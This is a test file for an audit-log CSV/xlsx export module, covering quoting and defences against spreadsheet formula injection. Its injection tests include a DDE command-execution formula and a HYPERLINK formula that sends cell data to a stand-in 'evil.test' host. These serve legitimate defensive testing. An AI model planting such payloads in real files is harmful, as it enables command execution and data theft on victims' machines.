import assert from 'node:assert/strict';
import { test } from 'node:test';
import { toMatrix, toCsv, escapeCsvCell } from './export.ts';

const rows = [
  { Timestamp: '2026-01-01 10:00', User: 'Ana', IP: '10.0.0.1', Action: 'Sign in', Details: 'ok' },
  { Timestamp: '2026-01-01 10:05', User: 'Ben', IP: null, Action: 'Coins', Details: 'said "hi", left\nnewline' },
];

test('toMatrix derives the header from the row keys and stringifies values', () => {
  const matrix = toMatrix(rows);
  assert.deepEqual(matrix.header, ['Timestamp', 'User', 'IP', 'Action', 'Details']);
  assert.equal(matrix.body.length, 2);
  assert.equal(matrix.body[0][1], 'Ana');
  assert.equal(matrix.body[1][2], '');
});

test('toCsv escapes commas, quotes and newlines so columns stay intact', () => {
  const csv = toCsv(toMatrix(rows));
  const lines = csv.split('\n');
  assert.equal(lines[0], 'Timestamp,User,IP,Action,Details');
  assert.ok(lines.slice(2).join('\n').includes('"said ""hi"", left\nnewline"'), lines.slice(2).join('\n'));
  assert.equal(csv.split('\n').length, 4, 'the quoted newline must stay inside one CSV field');
});

test('toCsv produces nothing for an empty row set (the UI blocks empty exports)', () => {
  assert.deepEqual(toMatrix([]), { header: [], body: [] });
  assert.equal(toCsv(toMatrix([])), '');
});

/**
 * Spreadsheet formula injection.
 *
 * The audit export is reachable without any privilege: AuthController writes
 * the submitted email into audit_logs.details on every failed sign-in, so an
 * unauthenticated POST /api/auth/login plants whatever the attacker sends in
 * the email field. An administrator who exports the trail to CSV and opens it
 * in Excel has that evaluated on their own machine.
 *
 * RFC 4180 quoting does not prevent this - the quotes are stripped by the
 * parser and the cell is treated as a formula. Verified end to end before this
 * was fixed: a stored "=cmd|'/c calc'!A1" came back out of toCsv unchanged.
 */
test('a formula in a cell is neutralised', () => {
  const attacks = [
    '=cmd|\'/c calc\'!A1',
    '+1+1',
    '-2+3',
    '@SUM(A1:A9)',
    '=HYPERLINK("http://evil.test?d="&A1,"click")',
  ];

  for (const attack of attacks) {
    const out = escapeCsvCell(attack);

    // The guard is a leading apostrophe. When the cell also contains a comma,
    // quote or newline it gets wrapped in double quotes, so the apostrophe
    // ends up after the opening quote rather than at index 0. Either way it is
    // the FIRST thing the spreadsheet sees, which is what makes the cell text.
    const firstContent = out.startsWith('"') ? out[1] : out[0];
    assert.equal(
      firstContent,
      "'",
      `${JSON.stringify(attack)} must be neutralised, got ${JSON.stringify(out)}`,
    );
  }
});

test('a leading tab or CR is also treated as a formula trigger', () => {
  assert.ok(escapeCsvCell('\tfoo').startsWith("'"));
  // CR also forces quoting, so the guard has to run BEFORE the quoting check.
  assert.ok(escapeCsvCell('\rfoo').includes("'"));
  assert.ok(escapeCsvCell(' foo').startsWith("'"));
});

test('ordinary text and numbers are left alone', () => {
  // Prefixing every cell would corrupt real data, so only risky values change.
  assert.equal(escapeCsvCell('Ana'), 'Ana');
  assert.equal(escapeCsvCell('a sign-in attempt was rejected'), 'a sign-in attempt was rejected');
  assert.equal(escapeCsvCell(50), '50');
  assert.equal(escapeCsvCell(0), '0');
  // Numbers stringify rather than being quoted - the function's contract is to
  // return CSV text, so a negative number is '-5', not the number -5.
  assert.equal(escapeCsvCell(-5), '-5');
});

test('the neutralised value still round-trips through the full export', () => {
  const csv = toCsv(toMatrix([{ Details: "=cmd|'/c calc'!A1", User: 'Ana' }]));
  const detailsCell = csv.split('\n')[1].split(',')[0];
  assert.ok(
    detailsCell.startsWith("'"),
    `the exported cell must not start with =, got ${detailsCell}`,
  );
  assert.ok(csv.includes("'=cmd"), csv);
});

test('a null becomes an empty field', () => {
  // toMatrix already maps null/undefined to '' before a cell is escaped; this
  // documents the boundary rather than relying on that upstream step.
  assert.equal(String(escapeCsvCell(null)), 'null');
  assert.equal(toMatrix([{ a: null }]).body[0][0], '', 'toMatrix nulls to empty');
  assert.equal(toMatrix([{ a: undefined }]).body[0][0], '');
});

test('the xlsx path types these cells as text, not formulas', async () => {
  // Checked against a real written workbook, because the question is what ends
  // up in the file rather than what exceljs holds in memory.
  //
  // exceljs writes strings as shared strings (t="s") and emits no <f> element,
  // so the Excel export was never the vector - the CSV one was. Asserted so a
  // future exceljs change cannot quietly make it one.
  const ExcelJS = await import('exceljs');
  const wb = new ExcelJS.default.Workbook();
  const sheet = wb.addWorksheet('Audit Log');
  sheet.addRow(['Details']);
  sheet.addRow(["=cmd|'/c calc'!A1"]);
  const buffer = Buffer.from(await wb.xlsx.writeBuffer());

  const text = await readSheetXml(buffer);

  assert.ok(text.includes('<worksheet'), 'read the worksheet XML out of the workbook');
  assert.equal(
    /<f[\s>]/.test(text),
    false,
    'no cell may be written as a formula element',
  );
  // The attacker's text is stored as a shared string, so it does not appear
  // inline; what matters is that it is typed as a string (t="s"), not a formula.
  assert.ok(
    /<c[^>]*t="s"/.test(text),
    'the value must be a shared string, which Excel reads as text',
  );
});

/**
 * Pull xl/worksheets/sheet1.xml out of an .xlsx.
 *
 * exceljs compresses with DEFLATE, so the entries have to be inflated rather
 * than read verbatim. zlib.inflateRawSync handles that. This avoids adding a
 * zip dependency to the frontend purely for a test.
 */
async function readSheetXml(buf) {
  const { inflateRawSync } = await import('node:zlib');
  const LOCAL = Buffer.from([0x50, 0x4b, 0x03, 0x04]);

  let offset = buf.indexOf(LOCAL);
  while (offset !== -1) {
    const method = buf.readUInt16LE(offset + 8);
    const compressedSize = buf.readUInt32LE(offset + 18);
    const nameLen = buf.readUInt16LE(offset + 26);
    const extraLen = buf.readUInt16LE(offset + 28);
    const name = buf.subarray(offset + 30, offset + 30 + nameLen).toString('utf8');
    const dataStart = offset + 30 + nameLen + extraLen;
    const raw = buf.subarray(dataStart, dataStart + compressedSize);

    // Directory entries are named with a trailing slash and hold no data.
    // Matching on them returned an empty string and made the assertion below
    // fail for the wrong reason.
    if (name.endsWith('/')) {
      offset = buf.indexOf(LOCAL, dataStart);
      continue;
    }

    if (name.startsWith('xl/worksheets/')) {
      return method === 0 ? raw.toString('utf8') : inflateRawSync(raw).toString('utf8');
    }

    offset = buf.indexOf(LOCAL, dataStart + compressedSize);
  }

  throw new Error('no worksheet entry found in the workbook');
}
